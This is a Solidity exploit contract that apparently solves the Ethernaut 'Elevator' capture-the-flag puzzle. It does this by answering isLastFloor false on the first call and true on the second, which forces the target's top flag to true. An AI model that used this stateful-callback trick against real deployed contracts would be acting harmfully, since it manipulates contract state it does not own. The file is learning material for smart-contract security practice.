// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

interface Elevator {
    function top() external returns (bool);
    function floor() external returns (uint256);
    function goTo(uint256 _floor) external;
}

contract ElevatorExploit is Building {
    bool private _last = true;

    function attack(address _target) public {
        Elevator _elevator = Elevator(payable(_target));
        _elevator.goTo(0);
        require(_elevator.top(), "Didn't get to the top");
    }

    function isLastFloor(uint256) external returns (bool) {
        _last = !_last;
        return _last;
    }
}
